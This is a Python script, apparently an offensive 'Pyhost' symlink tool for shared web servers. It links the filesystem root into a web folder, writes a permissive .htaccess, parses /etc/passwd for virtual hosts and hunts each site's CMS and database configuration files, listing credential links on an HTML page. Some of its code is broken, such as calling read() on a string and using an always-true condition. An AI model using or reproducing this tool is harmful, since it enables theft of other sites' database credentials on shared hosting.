# -*- coding: utf-8 -*-
# /*python
import re
import os

print("======= Pyhost | by: byt3_ver!fy =======")
if os.path.exists('pyhost_py'):
    os.chdir('pyhost_py')
else:
    os.makedirs('pyhost_py')
    os.chdir('pyhost_py')

os.system("ln -s / pyhost")

title = "<title>Pyhost | By: byt3_ver!fy</title><center><h1 style=color:grey;>Pyhost</h1><h2 " \
        "style=color:red;>By: byt3_ver!fy</h2><table> "
htc = "Options Indexes FollowSymlinks\nDirectoryIndex pyhost.phtml\nAddType text/html .phtml " \
      ".phtml\nAddHandler text/html .phtml "

m = open(".htaccess", "w+")
m.write(htc)
m.close()
print("[+] Sucessed write .htcaccess")

sites = []
configs = ["/wp-config.php",
           "/configuration.php",
           "/config/koneksi.php",
           "/db.php",
           "/includes/config.php",
           "/forum/config.php",
           "/sites/default/settings.php",
           "/config/settings.inc.php",
           "/app/etc/local.xml",
           "/admin/config.php",
           "/application/config/database.php"]

passwd = open("/etc/passwd", "r")
read = passwd.read()
print("[+] /etc/passwd found\n")

r = re.findall(r'/vhosts/\w+.\w+.\w{2,3}\b', read)

htm = open("pyhost.phtml", "w+")
htm.write(title)
number = 1

for vsite in r:
    vsite = vsite.replace("/vhosts/", "")
    sites.append(vsite)

for site in sites:
    for config in configs:
        target = "pyhost.txt/var/www/vhosts/" + site + "/httpdocs" + config
        target = target.read()
        if "DB" or "PASSWORD" or "=" in target:
            htm.write("<tr><td style=color:grey;>%s</td><td style=color:green;>%s</td><td><a href=%s><button "
                      "style=background-color:#696969;border:#696969;color:green;>Symlink !</button></a></td>" % (
                          number, site, target))
            number += 1
            print("[+] Succesed get config, access pyhost.htm for get the config :)\n")
        elif "No input file specified" in target:
            print("[-] No input file specified :(\n")
            print("[+] Lets get Bypassed\n")
            os.system("ln -s %s %s.txt" % (target, site))
            htm.write("<tr><td style=color:grey;>%s</td><td style=color:green;>%s</td><td><a "
                      "href=pyhost.txt/%s.txt><button "
                      "style=background-color:#696969;border:#696969;color:green;>Symlink !</button></a></td>" % (
                          number, site, site))
            print("[+] Bypass succesfully, access pyhost.html for get the config\n")
        else:
            print("[-] Can't get a config :(\n")
